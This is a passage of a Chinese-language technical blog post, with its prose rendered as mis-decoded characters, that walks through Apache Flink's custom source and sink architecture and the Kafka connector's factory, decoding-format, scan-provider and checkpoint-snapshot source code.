  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T14:05:03.000Z" title="Tue Jan 20 2026 14:05:03 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»8åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>æœ¬æ–‡æˆ‘ä»¬æ¥æ¢³ç† Kafka Connector ç›¸å…³çš„æºç ã€‚</p>
<h3 data-id="heading-0">è‡ªå®šä¹‰ Source å’Œ Sink</h3>
<p>åœ¨ä»‹ç» Kafka Connector ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹åœ¨ Flink ä¸­æ˜¯å¦‚ä½•æ”¯æŒè‡ªå®šä¹‰ Source å’Œ Sink çš„ã€‚æˆ‘ä»¬æ¥çœ‹ä¸€å¼  Flink å®˜æ–¹æ–‡æ¡£æä¾›çš„å›¾ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/57a5bc84c82248efa87969d645ce9eec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769522703&amp;x-signature=SzbKOFFgntjWtzjgc91KnxTtjkc%3D" alt="table-connector" loading="lazy"/></p>
<p>è¿™å¼ å›¾å±•ç¤ºäº† Connector çš„åŸºæœ¬ä½“ç³»ç»“æ„ï¼Œä¸‰å±‚æ¶æ„ä¹Ÿéå¸¸æ¸…æ™°ã€‚</p>
<h4 data-id="heading-1">Metadata</h4>
<p>é¦–å…ˆæ˜¯æœ€ä¸Šå±‚çš„ MetaDataï¼ŒCREATE TABLE ä¼šæ›´æ–° Catalogï¼Œç„¶åè¢«è½¬æ¢ä¸º TableAPI çš„ CatalogTableï¼ŒCatalogTable å®ä¾‹ç”¨äºè¡¨ç¤ºåŠ¨æ€è¡¨ï¼ˆSource æˆ– Sink è¡¨ï¼‰çš„å…ƒä¿¡æ¯ã€‚</p>
<h4 data-id="heading-2">Planning</h4>
<p>åœ¨è§£æå’Œä¼˜åŒ–ç¨‹åºæ—¶ï¼Œä¼šå°† CatalogTable è½¬æ¢ä¸º DynamicTableSource å’Œ DynamicTableSinkï¼Œåˆ†åˆ«ç”¨äºæŸ¥è¯¢å’Œæ’å…¥æ•°æ®ï¼Œè¿™ä¸¤ä¸ªå®ä¾‹çš„åˆ›å»ºéƒ½éœ€è¦å¯¹åº”çš„å·¥å‚ç±»ï¼Œå·¥å‚ç±»çš„å®Œæ•´è·¯å¾„éœ€è¦æ”¾åˆ°è¿™ä¸ªé…ç½®æ–‡ä»¶ä¸­ã€‚</p>
<pre><code class="hljs language-bash" lang="bash">META-INF/services/org.apache.flink.table.factories.Factory
</code></pre>
<p>å¦‚æœæœ‰éœ€è¦çš„è¯ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥åœ¨è§£æè¿‡ç¨‹ä¸­é…ç½®ç¼–ç å’Œè§£ç æ–¹æ³•ã€‚</p>
<p>åœ¨ Source ç«¯ï¼Œé€šè¿‡ä¸‰ä¸ªæ¥å£æ”¯æŒä¸åŒçš„æŸ¥è¯¢èƒ½åŠ›ã€‚</p>
<ul>
<li>
<p>ScanTableSourceï¼šç”¨äºæ¶ˆè´¹ changelog æµï¼Œæ‰«æçš„æ•°æ®æ”¯æŒ insertã€updataã€delete ä¸‰ç§ç±»å‹ã€‚ScanTableSource è¿˜æ”¯æŒå¾ˆå¤šå…¶ä»–çš„åŠŸèƒ½ï¼Œ éƒ½æ˜¯é€šè¿‡æ¥å£æä¾›çš„ã€‚å…·ä½“å¯ä»¥çœ‹å‚è€ƒè¿™ä¸ªè¿æ¥</p>
<pre><code class="hljs language-bash" lang="bash">https://nightlies.apache.org/flink/flink-docs-release-2.2/docs/dev/table/sourcessinks/<span class="hljs-comment">#source-abilities</span>
</code></pre>
</li>
<li>
<p>LookupTableSourceï¼šLookupTableSource ä¸ä¼šå…¨é‡è¯»å–è¡¨çš„æ•°æ®ï¼Œå®ƒåœ¨éœ€è¦æ—¶ä¼šå‘é€è¯·æ±‚ï¼Œæ‡’åŠ è½½æ•°æ®ã€‚ç›®å‰åªæ”¯æŒ insert-only å˜æ›´æ¨¡å¼ã€‚</p>
</li>
<li>
<p>VectorSearchTableSourceï¼šä½¿ç”¨ä¸€ä¸ªè¾“å…¥å‘é‡æ¥æœç´¢æ•°æ®ï¼Œå¹¶è¿”å›æœ€ç›¸ä¼¼çš„ Top-K è¡Œæ•°æ®ã€‚</p>
</li>
</ul>
<p>åœ¨ Sink ç«¯ï¼Œé€šè¿‡ DynamicTableSink æ¥å®ç°å…·ä½“çš„å†™å…¥é€»è¾‘ï¼Œè¿™é‡Œä¹Ÿæä¾›äº†ä¸€äº›ç”¨äºæ‰©å±•èƒ½åŠ›çš„æ¥å£ã€‚å…·ä½“å‚è€ƒ</p>
<pre><code class="hljs language-bash" lang="bash">https://nightlies.apache.org/flink/flink-docs-release-2.2/docs/dev/table/sourcessinks/<span class="hljs-comment">#sink-abilities</span>
</code></pre>
<h4 data-id="heading-3">Runtime</h4>
<p>é€»è¾‘è§£æå®Œæˆåï¼Œä¼šåˆ° Runtime å±‚ã€‚è¿™é‡Œå°±æ˜¯å®šä¹‰å‡ ä¸ª Providerï¼Œåœ¨ Provider ä¸­å®ç°å’Œè¿æ¥å™¨å…·ä½“çš„äº¤äº’é€»è¾‘ã€‚</p>
<h4 data-id="heading-4">å°ç»“</h4>
<p>å½“æˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªè‡ªå®šä¹‰çš„ Source å’Œ Sink æ—¶ï¼Œå°±å¯ä»¥é€šè¿‡ä»¥ä¸‹æ­¥éª¤å®ç°ã€‚</p>
<ol>
<li>
<p>å®šä¹‰ Flink SQL çš„ DDLï¼Œéœ€è¦å®šä¹‰ç›¸åº”çš„ Optionsã€‚</p>
</li>
<li>
<p>å®ç° DynamicTableSourceFactory å’Œ DynamicTableSinkFactoryï¼Œå¹¶æŠŠå®ç°ç±»çš„å…·ä½“è·¯å¾„å†™åˆ°é…ç½®æ–‡ä»¶ä¸­ã€‚</p>
</li>
<li>
<p>å®ç° DynamicTableSource å’Œ DynamicTableSinkï¼Œè¿™é‡Œéœ€è¦å¤„ç† SQL å±‚çš„å…ƒæ•°æ®ã€‚</p>
</li>
<li>
<p>æä¾› Providerï¼Œå°†é€»è¾‘å±‚ä¸åº•å±‚ DataStream å…³è”èµ·æ¥ã€‚</p>
</li>
<li>
<p>ç¼–å†™åº•å±‚ç®—å­ï¼Œå®ç° Source å’Œ Sink æ¥å£ã€‚</p>
</li>
</ol>
<h3 data-id="heading-5">Kafka Connector çš„å®ç°</h3>
<p>å¸¦ç€è¿™äº›çŸ¥è¯†ï¼Œæˆ‘ä»¬ä¸€èµ·æ¥çœ‹ä¸€ä¸‹ Kafka Connector ç›¸å…³çš„æºç ã€‚</p>
<p>Kafka Connector ä»£ç ç›®å‰å·²ç»æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„é¡¹ç›®äº†ã€‚é¡¹ç›®åœ°å€æ˜¯</p>
<pre><code class="hljs language-bash" lang="bash">https://github.com/apache/flink-connector-kafka
</code></pre>
<h4 data-id="heading-6">Factory</h4>
<p>æˆ‘ä»¬é¦–å…ˆæ‰¾åˆ°å®šä¹‰çš„å·¥å‚ç±»</p>
<pre><code class="hljs language-java" lang="java">org.apache.flink.streaming.connectors.kafka.table.KafkaDynamicTableFactory
org.apache.flink.streaming.connectors.kafka.table.UpsertKafkaDynamicTableFactory
</code></pre>
<p>ä»¥ KafkaDynamicTableFactory ä¸ºä¾‹ï¼Œå®ƒåŒæ—¶å®ç°äº† DynamicTableSourceFactory å’Œ DynamicTableSinkFactory ä¸¤ä¸ªæ¥å£ã€‚</p>
<p>KafkaDynamicTableFactory åŒ…å«ä»¥ä¸‹å‡ ä¸ªæ–¹æ³•ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/44ee5eb786cb48809ce55e6043c3b56e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769522703&amp;x-signature=qlEjjkldPHyzq1cTHUvag7yrLg0%3D" alt="KafkaDynamicTableFactory" loading="lazy"/></p>
<ul>
<li>
<p>factoryIdentifierï¼šè¿”å›ä¸€ä¸ªå”¯ä¸€æ ‡è¯†ç¬¦ï¼Œå¯¹åº” Flink SQL ä¸­ connector='xxx' è¿™ä¸ªé…ç½®ã€‚</p>
</li>
<li>
<p>requiredOptionsï¼šå¿…å¡«é…ç½®é›†åˆã€‚</p>
</li>
<li>
<p>optionalOptionsï¼šé€‰å¡«é…ç½®é›†åˆã€‚</p>
</li>
<li>
<p>forwardOptionsï¼šç›´æ¥ä¼ é€’åˆ° Runtime å±‚çš„é…ç½®é›†åˆã€‚</p>
</li>
<li>
<p>createDynamicTableSourceï¼šåˆ›å»º DynamicTableSourceã€‚</p>
</li>
<li>
<p>createDynamicTableSinkï¼šåˆ›å»º DynamicTableSinkã€‚</p>
</li>
</ul>
<h4 data-id="heading-7">Source ç«¯</h4>
<p>å·¥å‚ç±»çš„ createDynamicTableSource æ–¹æ³•åˆ›å»ºäº† DynamicTableSourceï¼Œæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹åˆ›å»ºçš„é€»è¾‘ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> DynamicTableSource <span class="hljs-title function_">createDynamicTableSource</span><span class="hljs-params">(Context context)</span> {
    <span class="hljs-keyword">final</span> <span class="hljs-type">TableFactoryHelper</span> <span class="hljs-variable">helper</span> <span class="hljs-operator">=</span> FactoryUtil.createTableFactoryHelper(<span class="hljs-built_in">this</span>, context);

    <span class="hljs-keyword">final</span> Optional&lt;DecodingFormat&lt;DeserializationSchema&lt;RowData&gt;&gt;&gt; keyDecodingFormat =
            getKeyDecodingFormat(helper);

    <span class="hljs-keyword">final</span> DecodingFormat&lt;DeserializationSchema&lt;RowData&gt;&gt; valueDecodingFormat =
            getValueDecodingFormat(helper);

    helper.validateExcept(PROPERTIES_PREFIX);

    <span class="hljs-keyword">final</span> <span class="hljs-type">ReadableConfig</span> <span class="hljs-variable">tableOptions</span> <span class="hljs-operator">=</span> helper.getOptions();

    validateTableSourceOptions(tableOptions);

    validatePKConstraints(
            context.getObjectIdentifier(),
            context.getPrimaryKeyIndexes(),
            context.getCatalogTable().getOptions(),
            valueDecodingFormat);

    <span class="hljs-keyword">final</span> <span class="hljs-type">StartupOptions</span> <span class="hljs-variable">startupOptions</span> <span class="hljs-operator">=</span> getStartupOptions(tableOptions);

    <span class="hljs-keyword">final</span> <span class="hljs-type">BoundedOptions</span> <span class="hljs-variable">boundedOptions</span> <span class="hljs-operator">=</span> getBoundedOptions(tableOptions);

    <span class="hljs-keyword">final</span> <span class="hljs-type">Properties</span> <span class="hljs-variable">properties</span> <span class="hljs-operator">=</span> getKafkaProperties(context.getCatalogTable().getOptions());

    <span class="hljs-comment">// add topic-partition discovery</span>
    <span class="hljs-keyword">final</span> <span class="hljs-type">Duration</span> <span class="hljs-variable">partitionDiscoveryInterval</span> <span class="hljs-operator">=</span>
            tableOptions.get(SCAN_TOPIC_PARTITION_DISCOVERY);
    properties.setProperty(
            KafkaSourceOptions.PARTITION_DISCOVERY_INTERVAL_MS.key(),
            Long.toString(partitionDiscoveryInterval.toMillis()));

    <span class="hljs-keyword">final</span> <span class="hljs-type">DataType</span> <span class="hljs-variable">physicalDataType</span> <span class="hljs-operator">=</span> context.getPhysicalRowDataType();

    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span>[] keyProjection = createKeyFormatProjection(tableOptions, physicalDataType);

    <span class="hljs-keyword">final</span> <span class="hljs-type">int</span>[] valueProjection = createValueFormatProjection(tableOptions, physicalDataType);

    <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">keyPrefix</span> <span class="hljs-operator">=</span> tableOptions.getOptional(KEY_FIELDS_PREFIX).orElse(<span class="hljs-literal">null</span>);

    <span class="hljs-keyword">final</span> <span class="hljs-type">Integer</span> <span class="hljs-variable">parallelism</span> <span class="hljs-operator">=</span> tableOptions.getOptional(SCAN_PARALLELISM).orElse(<span class="hljs-literal">null</span>);

    <span class="hljs-keyword">return</span> createKafkaTableSource(
            physicalDataType,
            keyDecodingFormat.orElse(<span class="hljs-literal">null</span>),
            valueDecodingFormat,
            keyProjection,
            valueProjection,
            keyPrefix,
            getTopics(tableOptions),
            getTopicPattern(tableOptions),
            properties,
            startupOptions.startupMode,
            startupOptions.specificOffsets,
            startupOptions.startupTimestampMillis,
            boundedOptions.boundedMode,
            boundedOptions.specificOffsets,
            boundedOptions.boundedTimestampMillis,
            context.getObjectIdentifier().asSummaryString(),
            parallelism);
}
</code></pre>
<p>åœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œé¦–å…ˆè¦è·å–åˆ° key å’Œ value çš„è§£ç æ ¼å¼ã€‚æ¥ç€æ˜¯å„ç§å‚æ•°æ ¡éªŒå’Œè·å–å¿…è¦çš„å±æ€§ã€‚æœ€ååˆ›å»º KafkaDynamicSource å®ä¾‹ã€‚</p>
<p>è·å–è§£ç æ ¼å¼éœ€è¦ç”¨åˆ° DeserializationFormatFactory å·¥å‚ï¼ŒDeserializationFormatFactory æœ‰å¤šä¸ªå®ç°ç±»ï¼Œå¯¹åº”äº†å¤šç§æ ¼å¼çš„ååºåˆ—åŒ–æ–¹æ³•ã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6ba6cb71d8984c6195c812c249511d1b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769522703&amp;x-signature=LgsUYXYpM0bSTFcTWOqm%2FRjz9sA%3D" alt="DeserializationFormatFactory" loading="lazy"/></p>
<p>æˆ‘ä»¬æ¥çœ‹æ¯”è¾ƒå¸¸è§çš„ Json æ ¼å¼çš„å·¥å‚ JsonFormatFactoryã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> DecodingFormat&lt;DeserializationSchema&lt;RowData&gt;&gt; <span class="hljs-title function_">createDecodingFormat</span><span class="hljs-params">(
        DynamicTableFactory.Context context, ReadableConfig formatOptions)</span> {
    FactoryUtil.validateFactoryOptions(<span class="hljs-built_in">this</span>, formatOptions);
    JsonFormatOptionsUtil.validateDecodingFormatOptions(formatOptions);

    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">failOnMissingField</span> <span class="hljs-operator">=</span> formatOptions.get(FAIL_ON_MISSING_FIELD);
    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">ignoreParseErrors</span> <span class="hljs-operator">=</span> formatOptions.get(IGNORE_PARSE_ERRORS);
    <span class="hljs-keyword">final</span> <span class="hljs-type">boolean</span> <span class="hljs-variable">jsonParserEnabled</span> <span class="hljs-operator">=</span> formatOptions.get(DECODE_JSON_PARSER_ENABLED);
    <span class="hljs-type">TimestampFormat</span> <span class="hljs-variable">timestampOption</span> <span class="hljs-operator">=</span> JsonFormatOptionsUtil.getTimestampFormat(formatOptions);

    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProjectableDecodingFormat</span>&lt;DeserializationSchema&lt;RowData&gt;&gt;() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> DeserializationSchema&lt;RowData&gt; <span class="hljs-title function_">createRuntimeDecoder</span><span class="hljs-params">(
                DynamicTableSource.Context context,
                DataType physicalDataType,
                <span class="hljs-type">int</span>[][] projections)</span> {
            <span class="hljs-keyword">final</span> <span class="hljs-type">DataType</span> <span class="hljs-variable">producedDataType</span> <span class="hljs-operator">=</span>
                    Projection.of(projections).project(physicalDataType);
            <span class="hljs-keyword">final</span> <span class="hljs-type">RowType</span> <span class="hljs-variable">rowType</span> <span class="hljs-operator">=</span> (RowType) producedDataType.getLogicalType();
            <span class="hljs-keyword">final</span> TypeInformation&lt;RowData&gt; rowDataTypeInfo =
                    context.createTypeInformation(producedDataType);
            <span class="hljs-keyword">if</span> (jsonParserEnabled) {
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JsonParserRowDataDeserializationSchema</span>(
                        rowType,
                        rowDataTypeInfo,
                        failOnMissingField,
                        ignoreParseErrors,
                        timestampOption,
                        toProjectedNames(
                                (RowType) physicalDataType.getLogicalType(), projections));
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JsonRowDataDeserializationSchema</span>(
                        rowType,
                        rowDataTypeInfo,
                        failOnMissingField,
                        ignoreParseErrors,
                        timestampOption);
            }
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> ChangelogMode <span class="hljs-title function_">getChangelogMode</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> ChangelogMode.insertOnly();
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">supportsNestedProjection</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> jsonParserEnabled;
        }
    };
}
</code></pre>
<p>åœ¨åˆ›å»ºè§£ç æ ¼å¼æ—¶ï¼Œæœ€é‡è¦çš„æ˜¯åˆ›å»ºè¿è¡Œæ—¶çš„è§£ç å™¨ï¼Œä¹Ÿå°±æ˜¯ DeserializationSchemaï¼Œåœ¨ JsonFormatFactory ä¸­ï¼Œæœ‰ JsonParserRowDataDeserializationSchema å’Œ JsonRowDataDeserializationSchema ä¸¤ç§å®ç°ï¼Œåˆ†åˆ«æ˜¯ç”¨äºå°† JsonParser å’Œ JsonNode è½¬æ¢æˆä¸º RowDataï¼Œå…·ä½“çš„é€»è¾‘éƒ½åœ¨ createNotNullConverter æ–¹æ³•ä¸­ã€‚</p>
<p>äº†è§£å®Œè§£ç æ ¼å¼åï¼Œæˆ‘ä»¬æŠŠè§†è§’æ‹‰å›åˆ° KafkaDynamicSourceï¼Œå®ƒå®ç°äº†ä¸‰ä¸ªæ¥å£ ScanTableSourceã€SupportsReadingMetadataã€SupportsWatermarkPushDownã€‚åˆ†åˆ«ç”¨äºæ¶ˆè´¹æ•°æ®ï¼Œè¯»å–å…ƒæ•°æ®å’Œç”Ÿæˆæ°´å°ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> ScanRuntimeProvider <span class="hljs-title function_">getScanRuntimeProvider</span><span class="hljs-params">(ScanContext context)</span> {
    <span class="hljs-keyword">final</span> DeserializationSchema&lt;RowData&gt; keyDeserialization =
            createDeserialization(context, keyDecodingFormat, keyProjection, keyPrefix);

    <span class="hljs-keyword">final</span> DeserializationSchema&lt;RowData&gt; valueDeserialization =
            createDeserialization(context, valueDecodingFormat, valueProjection, <span class="hljs-literal">null</span>);

    <span class="hljs-keyword">final</span> TypeInformation&lt;RowData&gt; producedTypeInfo =
            context.createTypeInformation(producedDataType);

    <span class="hljs-keyword">final</span> KafkaSource&lt;RowData&gt; kafkaSource =
            createKafkaSource(keyDeserialization, valueDeserialization, producedTypeInfo);

    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DataStreamScanProvider</span>() {
        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> DataStream&lt;RowData&gt; <span class="hljs-title function_">produceDataStream</span><span class="hljs-params">(
                ProviderContext providerContext, StreamExecutionEnvironment execEnv)</span> {
            <span class="hljs-keyword">if</span> (watermarkStrategy == <span class="hljs-literal">null</span>) {
                watermarkStrategy = WatermarkStrategy.noWatermarks();
            }
            DataStreamSource&lt;RowData&gt; sourceStream =
                    execEnv.fromSource(
                            kafkaSource, watermarkStrategy, <span class="hljs-string">"KafkaSource-"</span> + tableIdentifier);
            providerContext.generateUid(KAFKA_TRANSFORMATION).ifPresent(sourceStream::uid);
            <span class="hljs-keyword">return</span> sourceStream;
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">isBounded</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> kafkaSource.getBoundedness() == Boundedness.BOUNDED;
        }

        <span class="hljs-meta">@Override</span>
        <span class="hljs-keyword">public</span> Optional&lt;Integer&gt; <span class="hljs-title function_">getParallelism</span><span class="hljs-params">()</span> {
            <span class="hljs-keyword">return</span> Optional.ofNullable(parallelism);
        }
    };
}
</code></pre>
<p>åœ¨ ScanRuntimeProvider çš„é€»è¾‘ä¸­ï¼Œå…ˆè·å–åˆ°ååºåˆ—åŒ–å™¨ï¼Œä¹Ÿå°±æ˜¯åˆšåˆšæˆ‘ä»¬æåˆ°çš„ DeserializationSchemaã€‚</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fda648b380364e92baebee5c64ba586d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Z2i5ZCRR29vZ2xl57yW56iL:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769522703&amp;x-signature=rrIxhHnz6i3ip8ywXqcedhIZNis%3D" alt="KafkaSource" loading="lazy"/></p>
<p>ç„¶åå¼€å§‹åˆ›å»º KafkaSource å®ä¾‹ï¼Œå®ƒæ˜¯ Source çš„å®ç°ç±»ï¼Œä¹Ÿå°±æ˜¯æ‰§è¡Œå¼•æ“å±‚äº†ï¼Œè¿™ä¸ªè¿‡ç¨‹ä¼šä¾æ¬¡åˆ›å»ºå›¾ä¸­è¿™äº›ç±»ã€‚</p>
<p>KafkaSource ä¸­ä¸»è¦æ˜¯åˆ›å»º KafkaSourceReader å’Œ KafkaSourceEnumeratorï¼ŒKafkaSourceEnumerator æ˜¯è´Ÿè´£å’Œåˆ†ç‰‡ç›¸å…³çš„é€»è¾‘ï¼ŒåŒ…æ‹¬åˆ†ç‰‡åˆ†é…å’Œåˆ†ç‰‡å‘ç°ç­‰ã€‚</p>
<p>KafkaSourceReader ä¸­ä¸»è¦æ˜¯å’Œ State ç›¸å…³çš„é€»è¾‘ï¼ŒåŒ…æ‹¬è§¦å‘å¿«ç…§å’Œå®Œæˆ Checkpoint é€šçŸ¥çš„æ–¹æ³•ã€‚å½“åš Snapshot æ—¶ï¼Œä¼šè®°å½•æ´»è·ƒ split çš„ offsetï¼ŒåŒæ—¶å°† split ä½œä¸ºçŠ¶æ€æäº¤ã€‚å½“ Checkpoint å®Œæˆæ—¶ï¼Œä¼šè°ƒç”¨ <code>KafkaSourceFetcherManager.commitOffsets</code> æäº¤ offsetã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> List&lt;KafkaPartitionSplit&gt; <span class="hljs-title function_">snapshotState</span><span class="hljs-params">(<span class="hljs-type">long</span> checkpointId)</span> {
    List&lt;KafkaPartitionSplit&gt; splits = <span class="hljs-built_in">super</span>.snapshotState(checkpointId);
    <span class="hljs-keyword">if</span> (!commitOffsetsOnCheckpoint) {
        <span class="hljs-keyword">return</span> splits;
    }

    <span class="hljs-keyword">if</span> (splits.isEmpty() &amp;&amp; offsetsOfFinishedSplits.isEmpty()) {
        offsetsToCommit.put(checkpointId, Collections.emptyMap());
    } <span class="hljs-keyword">else</span> {
        Map&lt;TopicPartition, OffsetAndMetadata&gt; offsetsMap =
                offsetsToCommit.computeIfAbsent(checkpointId, id -&gt; <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;());
        <span class="hljs-comment">// Put the offsets of the active splits.</span>
        <span class="hljs-keyword">for</span> (KafkaPartitionSplit split : splits) {
            <span class="hljs-comment">// If the checkpoint is triggered before the partition starting offsets</span>
            <span class="hljs-comment">// is retrieved, do not commit the offsets for those partitions.</span>
            <span class="hljs-keyword">if</span> (split.getStartingOffset() &gt;= <span class="hljs-number">0</span>) {
                offsetsMap.put(
                        split.getTopicPartition(),
                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">OffsetAndMetadata</span>(split.getStartingOffset()));
            }
        }
        <span class="hljs-comment">// Put offsets of all the finished splits.</span>
        offsetsMap.putAll(offsetsOfFinishedSplits);
    }
    <span class="hljs-keyword">return</span> splits;
}


